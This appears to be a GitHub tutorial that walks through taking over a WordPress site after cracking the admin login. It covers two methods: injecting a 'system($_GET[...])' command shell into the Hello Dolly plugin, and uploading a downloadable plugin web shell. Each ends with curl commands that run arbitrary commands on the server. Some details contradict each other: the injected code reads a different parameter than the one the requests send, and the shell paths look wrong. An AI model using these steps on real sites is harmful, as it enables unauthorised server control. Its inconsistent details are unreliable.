This is the exploitation with WordPress-Plugin Vunlnerability.

-------------------------------------------------------------------------------------------------------------------------------------------
1. Hello Dolly Exploitation:

Step1.First, u do path cracking and get the wp-login.php.

<img width="462" height="324" alt="image" src="https://github.com/user-attachments/assets/71a7cc02-77b2-45aa-969b-62df0fc02a72" />


Step2.You can try any way to crack the account/password to log in this page.

Step3.After cracking, entering the backend system. Then, click 'Plugins->Plugin Editor'.

<img width="105" height="343" alt="image" src="https://github.com/user-attachments/assets/ae4b27ab-b2be-4187-99ff-9e4901580d80" />


Step4.Next, choice 'Hello Dolly' in the 'Select plugin to edit' on the right-top corner.

<img width="444" height="63" alt="image" src="https://github.com/user-attachments/assets/cfc00d09-6b14-4e3b-9c04-ed4520a9ef4f" />


Step5.Then, add 'echo system($_GET[1]) in the Hello Dolly script-hello.php.

<img width="566" height="372" alt="image" src="https://github.com/user-attachments/assets/1de5353e-795f-43e6-af95-59ae57b4be08" />



Step6.Then, click 'Upload File'. After clicking, click 'v' on Hello Dolly and 'Activate', 'Apply'.


Step7.Finally,type "http://offsec/wp-admin/hello.php? cmd={any command}" on web page url or type "curl http://offsec/wp-admin/hello.php
-G --data-urlencode 'cmd={any command}'" on the attacker host. u could access the resource on server.

* Hello Dolly Song link:https://www.youtube.com/watch?v=l7N2wssse14 
-----------------------------------------------------------------------------------------------------------------------------------------------

2.Uploading malicious plugin:

Step1.In the backend WordPress, click 'Plugins->Installed Plugins->Add New'.

<img width="471" height="363" alt="image" src="https://github.com/user-attachments/assets/2bb50b1e-c9c1-4371-b69c-000272005876" />


Step2.Into the page, click 'Upload Plugins'.

<img width="491" height="274" alt="image" src="https://github.com/user-attachments/assets/2f9f6f58-61eb-4adb-969f-dcffcb4e67c7" />


Step3.Then, click 'Browse' to upload malicious plugin script.

Step4.After uploading, click 'Install Now'.

<img width="448" height="130" alt="image" src="https://github.com/user-attachments/assets/993497bc-11bc-48e5-af6b-1ae9f4a1c633" />


Step5.Then, go back to 'Install Plugins' web page, we could observe the new plugin we add.

<img width="608" height="309" alt="image" src="https://github.com/user-attachments/assets/90d1fd70-61b8-4361-b744-b57298de838b" />


Step6.Finally, click 'v' on the new plugin and 'Activate', 'Apply'.

<img width="615" height="317" alt="image" src="https://github.com/user-attachments/assets/d4d75cf0-872e-4979-88ed-188407185160" />


Step7.Finally,type "http://offsec/wp-admin/plugin-shell.php? cmd={any command}" on web page url or type "curl http://offsec/wp-admin/plugin-shell.php
-G --data-urlencode 'cmd={any command}'" on the attacker host. u could access the resource on server.

*Download link for Plugin-shell.php: https://github.com/danielmiessler/SecLists/blob/master/Web-Shells/WordPress/plugin-shell.php

*Mention point: any command could revert to RCE command to let attacker get the shell of server.
